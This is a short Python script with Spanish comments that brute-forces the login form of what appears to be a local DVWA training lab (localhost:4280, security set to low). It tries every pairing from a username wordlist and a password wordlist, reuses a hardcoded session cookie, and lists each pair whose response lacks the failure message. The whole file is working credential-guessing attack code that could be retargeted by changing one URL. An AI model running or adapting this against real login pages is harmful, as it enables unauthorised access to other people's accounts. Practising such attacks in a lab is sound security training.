#!/usr/bin/env python3
# brute_cookie_all.py
# Igual que antes, pero recorre todas las combinaciones y muestra el total encontrado al final.

import requests
from pathlib import Path

BASE = "http://localhost:4280"
ENDPOINT = "/vulnerabilities/brute/"
URL = BASE + ENDPOINT

USERS_FILE = "usuarios.txt"
PASSES_FILE = "claves0.txt"

FAILURE_MARK = "Username and/or password incorrect."
COOKIE_VALUE = "PHPSESSID=37bb8c627760d477d5c03915cb5bd925; security=low"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
    "Referer": URL,
    "Cookie": COOKIE_VALUE,
}

TIMEOUT = 10

def load_lines(fname):
    p = Path(fname)
    if not p.exists():
        raise SystemExit(f"[ERROR] falta archivo: {fname}")
    return [l.strip() for l in p.read_text(encoding="utf-8").splitlines() if l.strip()]

def main():
    users = load_lines(USERS_FILE)
    passwords = load_lines(PASSES_FILE)

    sess = requests.Session()
    sess.headers.update(HEADERS)

    found = []
    total = 0
    for user in users:
        for pwd in passwords:
            total += 1
            params = {"username": user, "password": pwd, "Login": "Login"}
            try:
                r = sess.get(URL, params=params, timeout=TIMEOUT)
            except Exception as e:
                print(f"[!] Error request {user}:{pwd} -> {e}")
                continue

            body = r.text or ""
            if FAILURE_MARK not in body:
                print(f"[+] POSIBLE: {user}:{pwd}")
                found.append((user, pwd))

    print("\n[*] Proceso finalizado.")
    print(f"[*] Intentos realizados: {total}")
    print(f"[*] Pares posibles encontrados: {len(found)}")
    if found:
        print("[*] Lista de pares encontrados:")
        for u, p in found:
            print(f"  - {u}:{p}")

if __name__ == "__main__":
    main()
